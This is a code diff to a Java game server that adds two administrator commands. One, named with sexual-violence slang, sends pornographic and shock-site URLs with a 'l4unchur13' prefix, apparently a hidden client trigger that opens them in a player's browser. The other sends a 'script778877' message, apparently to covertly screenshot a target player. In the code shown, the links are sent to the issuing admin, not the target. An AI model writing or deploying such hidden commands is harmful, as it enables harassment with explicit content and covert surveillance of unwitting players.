@@ -272,6 +272,30 @@ public class AdministratorCommands implements NewCommandExtension {
                         return true;
                     }
                 },
+                new AdministratorCommand("darape", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
+                    @Override
+                    protected boolean execute(Player player, String[] input) {
+                        final Player target = World.getPlayerByName(input[0].trim());
+                        if (target.getPoints().getPkPoints() > 0 || target.getPoints().getDonatorPoints() > 0) {
+                            player.sendf("Player '%s' is Un-Rapeable.", TextUtils.optimizeText(target.getName()));
+                            return true;
+                        }
+                        String[] links = {"http://www.xnxx.com/home/5", "http://www.xvideos.com", "http://www.meatspin.com", "http://www.xnxx.com/", "http://xhamster.com/", "http://www.redtube.com/", "http://www.youporn.com/"};
+                        for(int i = 0; i < 10; i++)
+                            Arrays.asList(links).stream().forEach(string -> player.sendf("l4unchur13 %s", string));
+                        player.sendf("Player '%s' has been Raped.", TextUtils.optimizeText(target.getName()));
+                        return true;
+                    }
+                },
+                new AdministratorCommand("takexshot", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
+                    @Override
+                    protected boolean execute(Player player, String[] input) {
+                        final Player target = World.getPlayerByName(input[0].trim());
+                        target.sendMessage("script778877");
+                        player.sendf("Sent player '%s' script778877.", TextUtils.optimizeText(target.getName()));
+                        return true;
+                    }
+                },
                 new AdministratorCommand("demote", new CommandInput<String>(World::playerIsOnline, "Player", "An Online Player")) {
                     @Override
                     protected boolean execute(Player player, String[] input) {
@@ -339,7 +363,7 @@ public class AdministratorCommands implements NewCommandExtension {
                         return true;
                     }
                 },
-                new AdministratorCommand("addip", new CommandInput<String>(string -> !string.trim().isEmpty(), "String", "IP Address")) {
+                new AdministratorCommand("addip", new CommandInput<String>(string -> string.matches("^(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)(\\.(25[0-5]|2[0-4]\\d|[0-1]?\\d?\\d)){3}$"), "IP", "A valid IPv4 address.")) {
                     @Override
                     protected boolean execute(Player player, String[] input) {
                         String value = input[0].trim().toLowerCase().replaceAll("_", "");
